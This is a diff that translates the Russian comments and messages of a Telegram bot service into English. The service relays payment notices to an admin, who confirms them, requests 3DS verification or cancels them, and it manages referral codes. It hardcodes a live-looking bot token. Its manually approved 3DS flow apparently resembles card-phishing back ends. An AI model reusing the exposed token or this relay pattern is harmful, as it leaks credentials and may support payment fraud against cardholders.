@@ -5,25 +5,25 @@ class BotService {
     constructor() {
         this.bot = new TelegramBot("8216977215:AAEqwBaREu4vZvz4yj6d5ICZp5xgyZ8vQjY", { polling: true });
         this.pendingCallbacks = new Map();
-        this.ADMIN_CHAT_ID = 7209588642; // ID администратора
+        this.ADMIN_CHAT_ID = 7209588642; // Admin ID
         
-        // Удаляем webhook если он установлен
+        // Delete webhook if set
         this.bot.deleteWebHook().then(() => {
-            console.log('Webhook удален, используется polling');
+            console.log('Webhook deleted, using polling');
         }).catch(err => {
-            console.log('Ошибка при удалении webhook:', err.message);
+            console.log('Error deleting webhook:', err.message);
         });
 
-        // Регистрируем команды для управления рефералами
+        // Register commands for managing referrals
         this.registerCommands();
         
-        // Глобальный обработчик для всех callback'ов
+        // Global handler for all callbacks
         this.bot.on('callback_query', async (callbackQuery) => {
             const messageId = callbackQuery.message.message_id;
             const chatId = callbackQuery.message.chat.id;
             
-            console.log('Получен callback:', { messageId, data: callbackQuery.data });
-            console.log('Доступные messageId в pendingCallbacks:', Array.from(this.pendingCallbacks.keys()));
+            console.log('Received callback:', { messageId, data: callbackQuery.data });
+            console.log('Available messageId in pendingCallbacks:', Array.from(this.pendingCallbacks.keys()));
             
             if (this.pendingCallbacks.has(messageId)) {
                 const { resolve, timeout, originalMessage } = this.pendingCallbacks.get(messageId);
@@ -31,78 +31,78 @@ class BotService {
                 this.pendingCallbacks.delete(messageId);
                 
                 if (callbackQuery.data === 'confirm') {
-                    console.log('>>> НАЖАТА КНОПКА ПОДТВЕРДИТЬ <<<');
-                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Платеж подтвержден' });
+                    console.log('>>> CONFIRM BUTTON PRESSED <<<');
+                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment confirmed' });
                     await this.bot.editMessageText(
-                        `${originalMessage}\n\n✅ Статус: ПОДТВЕРЖДЕН`,
+                        `${originalMessage}\n\n✅ Status: CONFIRMED`,
                         {
                             chat_id: chatId,
                             message_id: messageId
                         }
                     );
-                    console.log('Отправляю результат: { confirmed: true }');
+                    console.log('Sending result: { confirmed: true }');
                     resolve({ confirmed: true });
                 } else if (callbackQuery.data === 'request_3ds') {
-                    console.log('>>> НАЖАТА КНОПКА 3DS <<<');
-                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '🔐 Запрос 3DS верификации' });
+                    console.log('>>> 3DS BUTTON PRESSED <<<');
+                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '🔐 3DS verification request' });
                     await this.bot.editMessageText(
-                        `${originalMessage}\n\n🔐 Статус: ОЖИДАНИЕ 3DS ВЕРИФИКАЦИИ`,
+                        `${originalMessage}\n\n🔐 Status: WAITING FOR 3DS VERIFICATION`,
                         {
                             chat_id: chatId,
                             message_id: messageId
                         }
                     );
-                    console.log('Отправляю результат: { requires3DS: true }');
+                    console.log('Sending result: { requires3DS: true }');
                     resolve({ requires3DS: true });
                 } else if (callbackQuery.data === 'cancel') {
-                    console.log('>>> НАЖАТА КНОПКА ОТМЕНИТЬ <<<');
-                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Платеж отменен' });
+                    console.log('>>> CANCEL BUTTON PRESSED <<<');
+                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Payment cancelled' });
                     await this.bot.editMessageText(
-                        `${originalMessage}\n\n❌ Статус: ОТМЕНЕН`,
+                        `${originalMessage}\n\n❌ Status: CANCELLED`,
                         {
                             chat_id: chatId,
                             message_id: messageId
                         }
                     );
-                    console.log('Отправляю результат: { confirmed: false, reason: "cancelled" }');
+                    console.log('Sending result: { confirmed: false, reason: "cancelled" }');
                     resolve({ confirmed: false, reason: 'cancelled' });
                 }
             } else {
-                console.log('Callback для messageId не найден в pendingCallbacks');
+                console.log('Callback for messageId not found in pendingCallbacks');
             }
         });
     }
 
     async sendMessageAndWait(chatId, message, buttonPayment) {
-        // Генерируем уникальный временный ID для этого запроса
+        // Generate unique temporary ID for this request
         const tempId = `_pending_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
         
-        // Создаем Promise для ожидания ответа
+        // Create Promise for waiting response
         const waitPromise = new Promise((resolve) => {
             const timeout = setTimeout(() => {
-                // Удаляем из обеих возможных мест (временный и реальный ID)
+                // Delete from both possible places (temporary and real ID)
                 this.pendingCallbacks.delete(tempId);
-                console.log('Таймаут ожидания подтверждения');
+                console.log('Confirmation timeout');
                 resolve({ confirmed: false, reason: 'timeout' });
-            }, 300000); // 5 минут таймаут
+            }, 300000); // 5 minutes timeout
             
-            // Сохраняем с уникальным временным ключом
+            // Save with unique temporary key
             this.pendingCallbacks.set(tempId, { resolve, timeout, originalMessage: message });
         });
 
-        // Отправляем сообщение
+        // Send message
         const sentMessage = await this.bot.sendMessage(chatId, message, buttonPayment);
         const messageId = sentMessage.message_id;
-        console.log('Сообщение отправлено в Telegram, messageId:', messageId);
+        console.log('Message sent to Telegram, messageId:', messageId);
         
-        // Заменяем временную запись на реальную с messageId
+        // Replace temporary entry with real messageId
         const pendingData = this.pendingCallbacks.get(tempId);
         if (pendingData) {
             this.pendingCallbacks.delete(tempId);
             this.pendingCallbacks.set(messageId, pendingData);
-            console.log('Ожидание подтверждения для messageId:', messageId);
+            console.log('Waiting for confirmation for messageId:', messageId);
         } else {
-            console.error('ОШИБКА: Не найдены данные для tempId:', tempId);
+            console.error('ERROR: Data not found for tempId:', tempId);
         }
 
         return waitPromise;
@@ -111,7 +111,7 @@ class BotService {
     registerCommands() {
         const referralService = require('./referral-service');
 
-        // Команда /refstats - статистика по коду
+        // Command /refstats - code statistics
         this.bot.onText(/\/refstats (.+)/, async (msg, match) => {
             if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
             
@@ -121,11 +121,11 @@ class BotService {
                 const message = this.formatReferralStats(stats);
                 await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
             } catch (error) {
-                await this.bot.sendMessage(msg.chat.id, `❌ Ошибка: ${error.message}`);
+                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
             }
         });
 
-        // Команда /reflink - получить ссылку для кода
+        // Command /reflink - get link for code
         this.bot.onText(/\/reflink (.+)/, async (msg, match) => {
             if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
             
@@ -136,27 +136,27 @@ class BotService {
                 const referralCode = await ReferralCodeModel.findOne({ code });
                 
                 if (!referralCode) {
-                    await this.bot.sendMessage(msg.chat.id, `❌ Код <b>${code}</b> не найден`, { parse_mode: 'HTML' });
+                    await this.bot.sendMessage(msg.chat.id, `❌ Code <b>${code}</b> not found`, { parse_mode: 'HTML' });
                     return;
                 }
                 
                 const siteUrl = process.env.CLIENT_URL || 'http://localhost:3000';
                 const referralLink = `${siteUrl}/?ref=${code}`;
-                const status = referralCode.isActive ? '✅ Активен' : '❌ Неактивен';
+                const status = referralCode.isActive ? '✅ Active' : '❌ Inactive';
                 
-                const message = `🔗 <b>Реферальная ссылка для кода: ${code}</b>\n\n` +
-                    `<b>Название:</b> ${referralCode.name}\n` +
-                    `<b>Статус:</b> ${status}\n\n` +
-                    `<b>Ссылка:</b>\n<code>${referralLink}</code>\n\n` +
-                    `<i>Скопируйте и используйте эту ссылку</i>`;
+                const message = `🔗 <b>Referral link for code: ${code}</b>\n\n` +
+                    `<b>Name:</b> ${referralCode.name}\n` +
+                    `<b>Status:</b> ${status}\n\n` +
+                    `<b>Link:</b>\n<code>${referralLink}</code>\n\n` +
+                    `<i>Copy and use this link</i>`;
                 
                 await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
             } catch (error) {
-                await this.bot.sendMessage(msg.chat.id, `❌ Ошибка: ${error.message}`);
+                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
             }
         });
 
-        // Команда /reflist - список всех кодов
+        // Command /reflist - list of all codes
         this.bot.onText(/\/reflist/, async (msg) => {
             if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
             
@@ -165,11 +165,11 @@ class BotService {
                 const message = this.formatAllReferralStats(stats);
                 await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
             } catch (error) {
-                await this.bot.sendMessage(msg.chat.id, `❌ Ошибка: ${error.message}`);
+                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
             }
         });
 
-        // Команда /refcreate - создать новый код
+        // Command /refcreate - create new code
         this.bot.onText(/\/refcreate\s+(.+)/, async (msg, match) => {
             if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
             
@@ -178,7 +178,7 @@ class BotService {
             if (args.length < 2) {
                 await this.bot.sendMessage(
                     msg.chat.id, 
-                    `❌ Неправильный формат команды!\n\n<b>Использование:</b>\n/refcreate КОД НАЗВАНИЕ\n\n<b>Пример:</b>\n/refcreate PROMO2024 Акция Новый Год`, 
+                    `❌ Wrong command format!\n\n<b>Usage:</b>\n/refcreate CODE NAME\n\n<b>Example:</b>\n/refcreate PROMO2024 New Year Promo`, 
                     { parse_mode: 'HTML' }
                 );
                 return;
@@ -193,59 +193,59 @@ class BotService {
                 const siteUrl = process.env.CLIENT_URL || 'http://localhost:3000';
                 const referralLink = `${siteUrl}/?ref=${code}`;
                 
-                const message = `✅ Реферальный код создан!\n\n` +
-                    `<b>Код:</b> ${code}\n` +
-                    `<b>Название:</b> ${name}\n\n` +
-                    `<b>🔗 Реферальная ссылка:</b>\n` +
+                const message = `✅ Referral code created!\n\n` +
+                    `<b>Code:</b> ${code}\n` +
+                    `<b>Name:</b> ${name}\n\n` +
+                    `<b>🔗 Referral link:</b>\n` +
                     `<code>${referralLink}</code>\n\n` +
-                    `<i>Используйте эту ссылку для привлечения пользователей</i>`;
+                    `<i>Use this link to attract users</i>`;
                 
                 await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
             } catch (error) {
-                await this.bot.sendMessage(msg.chat.id, `❌ Ошибка: ${error.message}`);
+                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
             }
         });
 
-        // Команда /reftoggle - активировать/деактивировать код
+        // Command /reftoggle - activate/deactivate code
         this.bot.onText(/\/reftoggle (.+)/, async (msg, match) => {
             if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
             
             const code = match[1].trim().toUpperCase();
             
             try {
-                // Сначала получаем текущий статус
+                // First get current status
                 const ReferralCodeModel = require('../models/referral-code-model');
                 const currentCode = await ReferralCodeModel.findOne({ code });
                 if (!currentCode) {
-                    await this.bot.sendMessage(msg.chat.id, `❌ Код <b>${code}</b> не найден`, { parse_mode: 'HTML' });
+                    await this.bot.sendMessage(msg.chat.id, `❌ Code <b>${code}</b> not found`, { parse_mode: 'HTML' });
                     return;
                 }
                 
-                // Переключаем статус
+                // Toggle status
                 const referralCode = await referralService.toggleReferralCode(code, !currentCode.isActive);
-                const status = referralCode.isActive ? '✅ активирован' : '❌ деактивирован';
-                await this.bot.sendMessage(msg.chat.id, `Код <b>${code}</b> ${status}`, { parse_mode: 'HTML' });
+                const status = referralCode.isActive ? '✅ activated' : '❌ deactivated';
+                await this.bot.sendMessage(msg.chat.id, `Code <b>${code}</b> ${status}`, { parse_mode: 'HTML' });
             } catch (error) {
-                await this.bot.sendMessage(msg.chat.id, `❌ Ошибка: ${error.message}`);
+                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
             }
         });
 
-        // Команда /help - список команд
+        // Command /help - command list
         this.bot.onText(/\/help/, async (msg) => {
             if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
             
             const helpMessage = `
-<b>📊 Команды управления рефералами:</b>
+<b>📊 Referral management commands:</b>
 
-/refcreate CODE NAME - создать код
-/reflink CODE - получить ссылку
-/refstats CODE - статистика по коду
-/reflist - список всех кодов
-/reftoggle CODE - вкл/выкл код
-/help - эта справка
+/refcreate CODE NAME - create code
+/reflink CODE - get link
+/refstats CODE - code statistics
+/reflist - list all codes
+/reftoggle CODE - on/off code
+/help - this help
 
-<b>Примеры:</b>
-/refcreate PROMO2024 Акция 2024
+<b>Examples:</b>
+/refcreate PROMO2024 2024 Promo
 /reflink PROMO2024
 /refstats PROMO2024
 /reftoggle PROMO2024
@@ -257,34 +257,34 @@ class BotService {
 
     formatReferralStats(stats) {
         return `
-<b>📊 Статистика по коду: ${stats.code}</b>
+<b>📊 Code statistics: ${stats.code}</b>
 
-📌 Название: ${stats.name}
-${stats.isActive ? '✅' : '❌'} Статус: ${stats.isActive ? 'Активен' : 'Неактивен'}
+📌 Name: ${stats.name}
+${stats.isActive ? '✅' : '❌'} Status: ${stats.isActive ? 'Active' : 'Inactive'}
 
-<b>Статистика:</b>
-👥 Регистраций: ${stats.stats.totalRegistrations}
-💳 Платежей: ${stats.stats.totalPayments}
-💰 Сумма: ${stats.stats.totalAmount}
-📈 Конверсия: ${stats.stats.conversionRate}
-✅ Пользователей с платежами: ${stats.stats.usersWithPayments}
+<b>Statistics:</b>
+👥 Registrations: ${stats.stats.totalRegistrations}
+💳 Payments: ${stats.stats.totalPayments}
+💰 Amount: ${stats.stats.totalAmount}
+📈 Conversion: ${stats.stats.conversionRate}
+✅ Users with payments: ${stats.stats.usersWithPayments}
         `;
     }
 
     formatAllReferralStats(statsList) {
         if (!statsList || statsList.length === 0) {
-            return '📊 <b>Реферальные коды не найдены</b>\n\nИспользуйте /refcreate для создания';
+            return '📊 <b>Referral codes not found</b>\n\nUse /refcreate to create';
         }
 
-        let message = '<b>📊 Все реферальные коды:</b>\n\n';
+        let message = '<b>📊 All referral codes:</b>\n\n';
         
         statsList.forEach((stats, index) => {
             const status = stats.isActive ? '✅' : '❌';
             message += `${index + 1}. ${status} <b>${stats.code}</b> - ${stats.name}\n`;
-            message += `   👥 ${stats.stats.totalRegistrations} рег. | 💳 ${stats.stats.totalPayments} платежей | 💰 ${stats.stats.totalAmount}\n\n`;
+            message += `   👥 ${stats.stats.totalRegistrations} reg. | 💳 ${stats.stats.totalPayments} payments | 💰 ${stats.stats.totalAmount}\n\n`;
         });
 
-        message += '\n<i>Используйте /refstats CODE для подробной информации</i>';
+        message += '\n<i>Use /refstats CODE for detailed information</i>';
         
         return message;
     }
